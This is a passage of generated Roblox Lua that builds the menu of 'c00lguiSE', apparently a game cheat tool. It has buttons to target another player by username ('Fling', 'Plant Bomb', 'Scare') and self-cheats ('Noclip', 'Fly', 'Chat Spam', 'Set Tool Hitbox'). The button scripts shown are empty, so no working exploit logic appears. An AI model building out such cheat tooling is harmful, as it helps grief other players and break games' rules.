G2L["3b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3b"]["ScrollBarThickness"] = 3;


-- StarterGui.c00lguiSE.Main.Pages.Players.PlayerCommands.UIListLayout
G2L["3c"] = Instance.new("UIListLayout", G2L["3b"]);
G2L["3c"]["HorizontalAlignment"] = Enum.HorizontalAlignment.Center;
G2L["3c"]["HorizontalFlex"] = Enum.UIFlexAlignment.SpaceEvenly;
G2L["3c"]["Wraps"] = true;
G2L["3c"]["Padding"] = UDim.new(0.01, 0);
G2L["3c"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
G2L["3c"]["FillDirection"] = Enum.FillDirection.Horizontal;


-- StarterGui.c00lguiSE.Main.Pages.Players.PlayerCommands.Button
G2L["3d"] = Instance.new("TextButton", G2L["3b"]);
G2L["3d"]["TextWrapped"] = true;
G2L["3d"]["BorderSizePixel"] = 0;
G2L["3d"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3d"]["TextSize"] = 15;
G2L["3d"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["3d"]["RichText"] = true;
G2L["3d"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["3d"]["Size"] = UDim2.new(0, 85, 0, 38);
G2L["3d"]["Name"] = [[Button]];
G2L["3d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3d"]["Text"] = [[Teleport To]];
G2L["3d"]["Position"] = UDim2.new(0, 0, 0.125, 0);


-- StarterGui.c00lguiSE.Main.Pages.Players.PlayerCommands.Button.ButtonScript
G2L["3e"] = Instance.new("LocalScript", G2L["3d"]);
G2L["3e"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.Players.PlayerCommands.Button
G2L["3f"] = Instance.new("TextButton", G2L["3b"]);
G2L["3f"]["TextWrapped"] = true;
G2L["3f"]["BorderSizePixel"] = 0;
G2L["3f"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3f"]["TextSize"] = 15;
G2L["3f"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["3f"]["RichText"] = true;
G2L["3f"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["3f"]["Size"] = UDim2.new(0, 85, 0, 38);
G2L["3f"]["Name"] = [[Button]];
G2L["3f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3f"]["Text"] = [[Client-Bring]];
G2L["3f"]["Position"] = UDim2.new(0, 0, 0.125, 0);


-- StarterGui.c00lguiSE.Main.Pages.Players.PlayerCommands.Button.ButtonScript
G2L["40"] = Instance.new("LocalScript", G2L["3f"]);
G2L["40"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.Players.PlayerCommands.Button
G2L["41"] = Instance.new("TextButton", G2L["3b"]);
G2L["41"]["TextWrapped"] = true;
G2L["41"]["BorderSizePixel"] = 0;
G2L["41"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["41"]["TextSize"] = 15;
G2L["41"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["41"]["RichText"] = true;
G2L["41"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["41"]["Size"] = UDim2.new(0, 85, 0, 38);
G2L["41"]["Name"] = [[Button]];
G2L["41"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["41"]["Text"] = [[Fling]];
G2L["41"]["Position"] = UDim2.new(0, 0, 0.125, 0);


-- StarterGui.c00lguiSE.Main.Pages.Players.PlayerCommands.Button.ButtonScript
G2L["42"] = Instance.new("LocalScript", G2L["41"]);
G2L["42"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.Players.PlayerCommands.Button
G2L["43"] = Instance.new("TextButton", G2L["3b"]);
G2L["43"]["TextWrapped"] = true;
G2L["43"]["BorderSizePixel"] = 0;
G2L["43"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["43"]["TextSize"] = 15;
G2L["43"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["43"]["RichText"] = true;
G2L["43"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["43"]["Size"] = UDim2.new(0, 85, 0, 38);
G2L["43"]["Name"] = [[Button]];
G2L["43"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["43"]["Text"] = [[Plant Bomb]];
G2L["43"]["Position"] = UDim2.new(0, 0, 0.125, 0);


-- StarterGui.c00lguiSE.Main.Pages.Players.PlayerCommands.Button.ButtonScript
G2L["44"] = Instance.new("LocalScript", G2L["43"]);
G2L["44"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.Players.PlayerCommands.Button
G2L["45"] = Instance.new("TextButton", G2L["3b"]);
G2L["45"]["TextWrapped"] = true;
G2L["45"]["BorderSizePixel"] = 0;
G2L["45"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["45"]["TextSize"] = 15;
G2L["45"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["45"]["RichText"] = true;
G2L["45"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["45"]["Size"] = UDim2.new(0, 85, 0, 38);
G2L["45"]["Name"] = [[Button]];
G2L["45"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["45"]["Text"] = [[Highlight: OFF]];
G2L["45"]["Position"] = UDim2.new(0, 0, 0.125, 0);


-- StarterGui.c00lguiSE.Main.Pages.Players.PlayerCommands.Button.ButtonScript
G2L["46"] = Instance.new("LocalScript", G2L["45"]);
G2L["46"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.Players.PlayerCommands.Button
G2L["47"] = Instance.new("TextButton", G2L["3b"]);
G2L["47"]["TextWrapped"] = true;
G2L["47"]["BorderSizePixel"] = 0;
G2L["47"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["47"]["TextSize"] = 15;
G2L["47"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["47"]["RichText"] = true;
G2L["47"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["47"]["Size"] = UDim2.new(0, 85, 0, 38);
G2L["47"]["Name"] = [[Button]];
G2L["47"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["47"]["Text"] = [[Spectate: OFF]];
G2L["47"]["Position"] = UDim2.new(0, 0, 0.125, 0);


-- StarterGui.c00lguiSE.Main.Pages.Players.PlayerCommands.Button.ButtonScript
G2L["48"] = Instance.new("LocalScript", G2L["47"]);
G2L["48"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.Players.PlayerCommands.Button
G2L["49"] = Instance.new("TextButton", G2L["3b"]);
G2L["49"]["TextWrapped"] = true;
G2L["49"]["BorderSizePixel"] = 0;
G2L["49"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["49"]["TextSize"] = 15;
G2L["49"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["49"]["RichText"] = true;
G2L["49"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["49"]["Size"] = UDim2.new(0, 85, 0, 38);
G2L["49"]["Name"] = [[Button]];
G2L["49"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["49"]["Text"] = [[Scare]];
G2L["49"]["Position"] = UDim2.new(0, 0, 0.125, 0);


-- StarterGui.c00lguiSE.Main.Pages.Players.PlayerCommands.Button.ButtonScript
G2L["4a"] = Instance.new("LocalScript", G2L["49"]);
G2L["4a"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.Players.PlayerCommands.Button
G2L["4b"] = Instance.new("TextButton", G2L["3b"]);
G2L["4b"]["TextWrapped"] = true;
G2L["4b"]["BorderSizePixel"] = 0;
G2L["4b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4b"]["TextSize"] = 15;
G2L["4b"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["4b"]["RichText"] = true;
G2L["4b"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["4b"]["Size"] = UDim2.new(0, 85, 0, 38);
G2L["4b"]["Name"] = [[Button]];
G2L["4b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4b"]["Text"] = [[Print Player Info]];
G2L["4b"]["Position"] = UDim2.new(0, 0, 0.125, 0);


-- StarterGui.c00lguiSE.Main.Pages.Players.PlayerCommands.Button.ButtonScript
G2L["4c"] = Instance.new("LocalScript", G2L["4b"]);
G2L["4c"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.Players.PlayerControl
G2L["4d"] = Instance.new("Frame", G2L["3a"]);
G2L["4d"]["BorderSizePixel"] = 3;
G2L["4d"]["BackgroundColor3"] = Color3.fromRGB(36, 36, 36);
G2L["4d"]["Size"] = UDim2.new(0, 212, 0, 25);
G2L["4d"]["Position"] = UDim2.new(0.2268, 0, 0.1339, 0);
G2L["4d"]["BorderColor3"] = Color3.fromRGB(21, 21, 21);
G2L["4d"]["Name"] = [[PlayerControl]];


-- StarterGui.c00lguiSE.Main.Pages.Players.PlayerControl.PlayerInput
G2L["4e"] = Instance.new("TextBox", G2L["4d"]);
G2L["4e"]["Name"] = [[PlayerInput]];
G2L["4e"]["PlaceholderColor3"] = Color3.fromRGB(156, 0, 0);
G2L["4e"]["BorderSizePixel"] = 2;
G2L["4e"]["TextWrapped"] = true;
G2L["4e"]["TextSize"] = 14;
G2L["4e"]["TextColor3"] = Color3.fromRGB(255, 51, 0);
G2L["4e"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["4e"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["4e"]["PlaceholderText"] = [[Username]];
G2L["4e"]["Size"] = UDim2.new(0, 182, 0, 25);
G2L["4e"]["BorderColor3"] = Color3.fromRGB(21, 21, 21);
G2L["4e"]["Text"] = [[]];


-- StarterGui.c00lguiSE.Main.Pages.Players.PlayerControl.SelectButton
G2L["4f"] = Instance.new("TextButton", G2L["4d"]);
G2L["4f"]["BorderSizePixel"] = 2;
G2L["4f"]["TextColor3"] = Color3.fromRGB(255, 51, 0);
G2L["4f"]["TextSize"] = 14;
G2L["4f"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["4f"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["4f"]["Size"] = UDim2.new(0, 30, 0, 25);
G2L["4f"]["Name"] = [[SelectButton]];
G2L["4f"]["BorderColor3"] = Color3.fromRGB(21, 21, 21);
G2L["4f"]["Text"] = [[Select]];
G2L["4f"]["Position"] = UDim2.new(0.85849, 0, 0, 0);


-- StarterGui.c00lguiSE.Main.Pages.Players.PlayerControl.SelectButton.LocalScript
G2L["50"] = Instance.new("LocalScript", G2L["4f"]);



-- StarterGui.c00lguiSE.Main.Pages.Players.PlayerControl.PlayerSelect
G2L["51"] = Instance.new("ScrollingFrame", G2L["4d"]);
G2L["51"]["Visible"] = false;
G2L["51"]["Active"] = true;
G2L["51"]["BorderSizePixel"] = 3;
G2L["51"]["BackgroundColor3"] = Color3.fromRGB(36, 36, 36);
G2L["51"]["Name"] = [[PlayerSelect]];
G2L["51"]["Size"] = UDim2.new(0, 212, 0, 143);
G2L["51"]["ScrollBarImageColor3"] = Color3.fromRGB(255, 51, 0);
G2L["51"]["Position"] = UDim2.new(0, 0, 1.1825, 0);
G2L["51"]["BorderColor3"] = Color3.fromRGB(21, 21, 21);
G2L["51"]["ScrollBarThickness"] = 3;


-- StarterGui.c00lguiSE.Main.Pages.Players.PlayerControl.PlayerSelect.UIListLayout
G2L["52"] = Instance.new("UIListLayout", G2L["51"]);
G2L["52"]["HorizontalAlignment"] = Enum.HorizontalAlignment.Center;
G2L["52"]["HorizontalFlex"] = Enum.UIFlexAlignment.SpaceEvenly;
G2L["52"]["Wraps"] = true;
G2L["52"]["Padding"] = UDim.new(0.01, 0);
G2L["52"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
G2L["52"]["FillDirection"] = Enum.FillDirection.Horizontal;


-- StarterGui.c00lguiSE.Main.Pages.Players.PlayerControl.PlayerSelect.LocalScript
G2L["53"] = Instance.new("LocalScript", G2L["51"]);



-- StarterGui.c00lguiSE.Main.Pages.Players.PlayerControl.PlayerSelect.Template
G2L["54"] = Instance.new("TextButton", G2L["51"]);
G2L["54"]["BorderSizePixel"] = 2;
G2L["54"]["TextColor3"] = Color3.fromRGB(255, 51, 0);
G2L["54"]["TextSize"] = 14;
G2L["54"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["54"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["54"]["Size"] = UDim2.new(0, 214, 0, 25);
G2L["54"]["Name"] = [[Template]];
G2L["54"]["BorderColor3"] = Color3.fromRGB(21, 21, 21);
G2L["54"]["Text"] = [[N/A]];
G2L["54"]["Position"] = UDim2.new(-0.01179, 0, 0, 0);


-- StarterGui.c00lguiSE.Main.Pages.Players.PlayerControl.PlayerSelect.Template.LocalScript
G2L["55"] = Instance.new("LocalScript", G2L["54"]);



-- StarterGui.c00lguiSE.Main.Pages.Players.PlayerControl.PlayerSelect.Template.Icon
G2L["56"] = Instance.new("ImageLabel", G2L["54"]);
G2L["56"]["BorderSizePixel"] = 0;
G2L["56"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["56"]["Image"] = [[rbxasset://textures/ui/GuiImagePlaceholder.png]];
G2L["56"]["Size"] = UDim2.new(0, 25, 0, 25);
G2L["56"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["56"]["BackgroundTransparency"] = 1;
G2L["56"]["Name"] = [[Icon]];


-- StarterGui.c00lguiSE.Main.Pages.LocalPlayer
G2L["57"] = Instance.new("ScrollingFrame", G2L["25"]);
G2L["57"]["Visible"] = false;
G2L["57"]["Active"] = true;
G2L["57"]["BorderSizePixel"] = 0;
G2L["57"]["BackgroundColor3"] = Color3.fromRGB(36, 36, 36);
G2L["57"]["Name"] = [[LocalPlayer]];
G2L["57"]["Size"] = UDim2.new(0, 388, 0, 200);
G2L["57"]["ScrollBarImageColor3"] = Color3.fromRGB(255, 51, 0);
G2L["57"]["Position"] = UDim2.new(0.0198, 0, 0.168, 0);
G2L["57"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["57"]["ScrollBarThickness"] = 3;


-- StarterGui.c00lguiSE.Main.Pages.LocalPlayer.Button
G2L["58"] = Instance.new("TextButton", G2L["57"]);
G2L["58"]["TextWrapped"] = true;
G2L["58"]["BorderSizePixel"] = 0;
G2L["58"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["58"]["TextSize"] = 15;
G2L["58"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["58"]["RichText"] = true;
G2L["58"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["58"]["Size"] = UDim2.new(0, 85, 0, 38);
G2L["58"]["Name"] = [[Button]];
G2L["58"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["58"]["Text"] = [[Set WalkSpeed]];


-- StarterGui.c00lguiSE.Main.Pages.LocalPlayer.Button.ButtonScript
G2L["59"] = Instance.new("LocalScript", G2L["58"]);
G2L["59"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.LocalPlayer.UIListLayout
G2L["5a"] = Instance.new("UIListLayout", G2L["57"]);
G2L["5a"]["HorizontalAlignment"] = Enum.HorizontalAlignment.Center;
G2L["5a"]["HorizontalFlex"] = Enum.UIFlexAlignment.SpaceEvenly;
G2L["5a"]["Wraps"] = true;
G2L["5a"]["Padding"] = UDim.new(0.01, 0);
G2L["5a"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
G2L["5a"]["FillDirection"] = Enum.FillDirection.Horizontal;


-- StarterGui.c00lguiSE.Main.Pages.LocalPlayer.Button
G2L["5b"] = Instance.new("TextButton", G2L["57"]);
G2L["5b"]["TextWrapped"] = true;
G2L["5b"]["BorderSizePixel"] = 0;
G2L["5b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["5b"]["TextSize"] = 15;
G2L["5b"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["5b"]["RichText"] = true;
G2L["5b"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["5b"]["Size"] = UDim2.new(0, 85, 0, 38);
G2L["5b"]["Name"] = [[Button]];
G2L["5b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["5b"]["Text"] = [[Set JumpPower]];
G2L["5b"]["Position"] = UDim2.new(0, 0, 0.125, 0);


-- StarterGui.c00lguiSE.Main.Pages.LocalPlayer.Button.ButtonScript
G2L["5c"] = Instance.new("LocalScript", G2L["5b"]);
G2L["5c"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.LocalPlayer.Button
G2L["5d"] = Instance.new("TextButton", G2L["57"]);
G2L["5d"]["TextWrapped"] = true;
G2L["5d"]["BorderSizePixel"] = 0;
G2L["5d"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["5d"]["TextSize"] = 15;
G2L["5d"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["5d"]["RichText"] = true;
G2L["5d"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["5d"]["Size"] = UDim2.new(0, 85, 0, 38);
G2L["5d"]["Name"] = [[Button]];
G2L["5d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["5d"]["Text"] = [[Set Gravity]];
G2L["5d"]["Position"] = UDim2.new(0, 0, 0.125, 0);


-- StarterGui.c00lguiSE.Main.Pages.LocalPlayer.Button.ButtonScript
G2L["5e"] = Instance.new("LocalScript", G2L["5d"]);
G2L["5e"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.LocalPlayer.Button
G2L["5f"] = Instance.new("TextButton", G2L["57"]);
G2L["5f"]["TextWrapped"] = true;
G2L["5f"]["BorderSizePixel"] = 0;
G2L["5f"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["5f"]["TextSize"] = 15;
G2L["5f"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["5f"]["RichText"] = true;
G2L["5f"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["5f"]["Size"] = UDim2.new(0, 85, 0, 38);
G2L["5f"]["Name"] = [[Button]];
G2L["5f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["5f"]["Text"] = [[Chicken Arms]];
G2L["5f"]["Position"] = UDim2.new(0, 0, 0.125, 0);


-- StarterGui.c00lguiSE.Main.Pages.LocalPlayer.Button.ButtonScript
G2L["60"] = Instance.new("LocalScript", G2L["5f"]);
G2L["60"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.LocalPlayer.Button
G2L["61"] = Instance.new("TextButton", G2L["57"]);
G2L["61"]["TextWrapped"] = true;
G2L["61"]["BorderSizePixel"] = 0;
G2L["61"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["61"]["TextSize"] = 15;
G2L["61"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["61"]["RichText"] = true;
G2L["61"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["61"]["Size"] = UDim2.new(0, 85, 0, 38);
G2L["61"]["Name"] = [[Button]];
G2L["61"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["61"]["Text"] = [[Create Platform]];
G2L["61"]["Position"] = UDim2.new(0, 0, 0.125, 0);


-- StarterGui.c00lguiSE.Main.Pages.LocalPlayer.Button.ButtonScript
G2L["62"] = Instance.new("LocalScript", G2L["61"]);
G2L["62"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.LocalPlayer.Button
G2L["63"] = Instance.new("TextButton", G2L["57"]);
G2L["63"]["TextWrapped"] = true;
G2L["63"]["BorderSizePixel"] = 0;
G2L["63"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["63"]["TextSize"] = 15;
G2L["63"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["63"]["RichText"] = true;
G2L["63"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["63"]["Size"] = UDim2.new(0, 85, 0, 38);
G2L["63"]["Name"] = [[Button]];
G2L["63"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["63"]["Text"] = [[Infinite Jump: OFF]];
G2L["63"]["Position"] = UDim2.new(0, 0, 0.125, 0);


-- StarterGui.c00lguiSE.Main.Pages.LocalPlayer.Button.ButtonScript
G2L["64"] = Instance.new("LocalScript", G2L["63"]);
G2L["64"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.LocalPlayer.Button
G2L["65"] = Instance.new("TextButton", G2L["57"]);
G2L["65"]["TextWrapped"] = true;
G2L["65"]["BorderSizePixel"] = 0;
G2L["65"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["65"]["TextSize"] = 15;
G2L["65"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["65"]["RichText"] = true;
G2L["65"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["65"]["Size"] = UDim2.new(0, 85, 0, 38);
G2L["65"]["Name"] = [[Button]];
G2L["65"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["65"]["Text"] = [[Noclip: OFF]];
G2L["65"]["Position"] = UDim2.new(0, 0, 0.125, 0);


-- StarterGui.c00lguiSE.Main.Pages.LocalPlayer.Button.ButtonScript
G2L["66"] = Instance.new("LocalScript", G2L["65"]);
G2L["66"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.LocalPlayer.Button
G2L["67"] = Instance.new("TextButton", G2L["57"]);
G2L["67"]["TextWrapped"] = true;
G2L["67"]["BorderSizePixel"] = 0;
G2L["67"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["67"]["TextSize"] = 15;
G2L["67"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["67"]["RichText"] = true;
G2L["67"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["67"]["Size"] = UDim2.new(0, 85, 0, 38);
G2L["67"]["Name"] = [[Button]];
G2L["67"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["67"]["Text"] = [[Chat Spam: OFF]];
G2L["67"]["Position"] = UDim2.new(0, 0, 0.125, 0);


-- StarterGui.c00lguiSE.Main.Pages.LocalPlayer.Button.ButtonScript
G2L["68"] = Instance.new("LocalScript", G2L["67"]);
G2L["68"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.LocalPlayer.Button
G2L["69"] = Instance.new("TextButton", G2L["57"]);
G2L["69"]["TextWrapped"] = true;
G2L["69"]["BorderSizePixel"] = 0;
G2L["69"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["69"]["TextSize"] = 15;
G2L["69"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["69"]["RichText"] = true;
G2L["69"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["69"]["Size"] = UDim2.new(0, 85, 0, 38);
G2L["69"]["Name"] = [[Button]];
G2L["69"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["69"]["Text"] = [[Respawn]];
G2L["69"]["Position"] = UDim2.new(0, 0, 0.125, 0);


-- StarterGui.c00lguiSE.Main.Pages.LocalPlayer.Button.ButtonScript
G2L["6a"] = Instance.new("LocalScript", G2L["69"]);
G2L["6a"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.LocalPlayer.Button
G2L["6b"] = Instance.new("TextButton", G2L["57"]);
G2L["6b"]["TextWrapped"] = true;
G2L["6b"]["BorderSizePixel"] = 0;
G2L["6b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["6b"]["TextSize"] = 15;
G2L["6b"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["6b"]["RichText"] = true;
G2L["6b"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["6b"]["Size"] = UDim2.new(0, 85, 0, 38);
G2L["6b"]["Name"] = [[Button]];
G2L["6b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6b"]["Text"] = [[Reset Camera]];
G2L["6b"]["Position"] = UDim2.new(0, 0, 0.125, 0);


-- StarterGui.c00lguiSE.Main.Pages.LocalPlayer.Button.ButtonScript
G2L["6c"] = Instance.new("LocalScript", G2L["6b"]);
G2L["6c"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.LocalPlayer.Button
G2L["6d"] = Instance.new("TextButton", G2L["57"]);
G2L["6d"]["TextWrapped"] = true;
G2L["6d"]["BorderSizePixel"] = 0;
G2L["6d"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["6d"]["TextSize"] = 15;
G2L["6d"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["6d"]["RichText"] = true;
G2L["6d"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["6d"]["Size"] = UDim2.new(0, 85, 0, 38);
G2L["6d"]["Name"] = [[Button]];
G2L["6d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6d"]["Text"] = [[Fly: OFF]];
G2L["6d"]["Position"] = UDim2.new(0, 0, 0.125, 0);


-- StarterGui.c00lguiSE.Main.Pages.LocalPlayer.Button.ButtonScript
G2L["6e"] = Instance.new("LocalScript", G2L["6d"]);
G2L["6e"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.LocalPlayer.Button
G2L["6f"] = Instance.new("TextButton", G2L["57"]);
G2L["6f"]["TextWrapped"] = true;
G2L["6f"]["BorderSizePixel"] = 0;
G2L["6f"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["6f"]["TextSize"] = 15;
G2L["6f"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["6f"]["RichText"] = true;
G2L["6f"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["6f"]["Size"] = UDim2.new(0, 85, 0, 38);
G2L["6f"]["Name"] = [[Button]];
G2L["6f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6f"]["Text"] = [[Block Head]];
G2L["6f"]["Position"] = UDim2.new(0, 0, 0.125, 0);


-- StarterGui.c00lguiSE.Main.Pages.LocalPlayer.Button.ButtonScript
G2L["70"] = Instance.new("LocalScript", G2L["6f"]);
G2L["70"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.LocalPlayer.Button
G2L["71"] = Instance.new("TextButton", G2L["57"]);
G2L["71"]["TextWrapped"] = true;
G2L["71"]["BorderSizePixel"] = 0;
G2L["71"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["71"]["TextSize"] = 15;
G2L["71"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["71"]["RichText"] = true;
G2L["71"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["71"]["Size"] = UDim2.new(0, 85, 0, 38);
G2L["71"]["Name"] = [[Button]];
G2L["71"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["71"]["Text"] = [[Set Tool Hitbox]];
G2L["71"]["Position"] = UDim2.new(0, 0, 0.125, 0);


-- StarterGui.c00lguiSE.Main.Pages.LocalPlayer.Button.ButtonScript
G2L["72"] = Instance.new("LocalScript", G2L["71"]);
G2L["72"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.LocalPlayer.Button
G2L["73"] = Instance.new("TextButton", G2L["57"]);
G2L["73"]["TextWrapped"] = true;
